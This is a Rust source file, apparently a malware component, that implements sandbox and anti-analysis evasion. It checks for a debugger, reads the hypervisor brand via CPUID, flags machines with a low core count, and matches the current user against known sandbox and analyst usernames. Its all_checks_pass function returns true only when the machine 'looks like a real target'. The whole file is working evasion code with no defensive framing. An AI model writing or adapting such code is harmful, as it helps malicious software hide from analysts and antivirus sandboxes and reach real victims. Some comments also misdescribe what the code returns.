//! antidetect.rs — Anti-analysis / sandbox-evasion checks
//!
//! is_debugger_present()   — wraps IsDebuggerPresent
//! hypervisor_vendor()     — CPUID leaf 0x40000000 (hypervisor brand string)
//! is_low_core_count()     — CPUID leaf 1, EBX[23:16] < 2  →  likely sandbox
//! is_bad_username()       — flags known sandbox usernames
//! all_checks_pass()       — run everything; true = safe to proceed

#![allow(dead_code, non_snake_case)]

use winapi::um::debugapi::IsDebuggerPresent;

/// True when a debugger is attached to this process.
pub fn is_debugger_present() -> bool {
    unsafe { IsDebuggerPresent() != 0 }
}

/// Return the hypervisor vendor string from CPUID leaf 0x40000000,
/// or an empty string on bare metal.
pub fn hypervisor_vendor() -> [u8; 12] {
    let mut ebx_out: u32;
    let mut ecx_out: u32;
    let mut edx_out: u32;

    unsafe {
        core::arch::asm!(
            "push rbx",
            "cpuid",
            "mov {:e}, ebx",   // :e forces 32-bit register name — avoids asm_sub_register warning
            "pop rbx",
            out(reg) ebx_out,
            inout("eax") 0x4000_0000u32 => _,
            out("ecx") ecx_out,
            out("edx") edx_out,
            options(nostack, nomem),
        );
    }

    let mut vendor = [0u8; 12];
    vendor[0..4].copy_from_slice(&ebx_out.to_le_bytes());
    vendor[4..8].copy_from_slice(&ecx_out.to_le_bytes());
    vendor[8..12].copy_from_slice(&edx_out.to_le_bytes());
    vendor
}

/// True when the logical core count (CPUID leaf 1, EBX[23:16]) is below 2,
/// which is a strong indicator of a VM/sandbox with a single vCPU.
pub fn is_low_core_count() -> bool {
    let ebx_val: u32;
    unsafe {
        core::arch::asm!(
            "push rbx",
            "cpuid",
            "mov {:e}, ebx",   // :e forces 32-bit register name
            "pop rbx",
            out(reg) ebx_val,
            inout("eax") 1u32 => _,
            out("ecx") _,
            out("edx") _,
            options(nostack, nomem),
        );
    }
    let logical_count = (ebx_val >> 16) & 0xFF;
    logical_count < 2
}

/// Flag well-known sandbox/AV-lab usernames.
pub fn is_bad_username() -> bool {
    // Wide-string comparison against common sandbox user accounts.
    const BAD: &[&str] = &[
        "sandbox", "malware", "virus", "test", "analysis",
        "cuckoo", "vmware", "vbox", "john", "user",
    ];
    let mut buf = [0u16; 256];
    let mut sz: u32 = 256;
    let ok = unsafe {
        winapi::um::winbase::GetUserNameW(buf.as_mut_ptr(), &mut sz)
    };
    if ok == 0 { return false; }
    let name = String::from_utf16_lossy(&buf[..sz.saturating_sub(1) as usize])
        .to_lowercase();
    BAD.iter().any(|bad| name.contains(bad))
}

/// Run all anti-analysis checks.
/// Returns `true` only when the environment looks like a real target.
pub fn all_checks_pass() -> bool {
    if is_debugger_present()  { return false; }
    if is_low_core_count()    { return false; }
    if is_bad_username()      { return false; }
    let hv = hypervisor_vendor();
    // Known hypervisor strings: "KVMKVMKVM", "VMwareVMware", "VBoxVBoxVBox", "Microsoft Hv"
    let hv_str = core::str::from_utf8(&hv).unwrap_or("");
    if hv_str.contains("VMware") || hv_str.contains("VBox")
        || hv_str.contains("KVM") || hv_str.contains("Microsoft Hv") {
        return false;
    }
    true
}
